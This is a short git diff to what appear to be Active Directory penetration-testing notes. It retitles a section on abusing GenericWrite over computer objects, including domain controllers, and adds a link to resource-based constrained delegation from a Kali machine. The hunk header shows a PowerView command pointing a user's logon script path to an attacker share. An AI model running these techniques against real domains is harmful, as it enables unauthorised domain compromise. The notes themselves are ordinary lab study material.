@@ -693,7 +693,9 @@ Set-DomainObject -Identity SHAUN.BLAKE -Set @{'scriptpath'='\\192.168.45.218\sha
 
 <details>
 
-<summary>Exploiting GenericWrite on Computer Object</summary>
+<summary>Exploiting GenericWrite on Computer Object (Including DC)<br></summary>
+
+OR USE [RBCD FROM KALI ATTACKER MACHINE!!](lateral-movement.md#resource-based-constrained-delegation)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
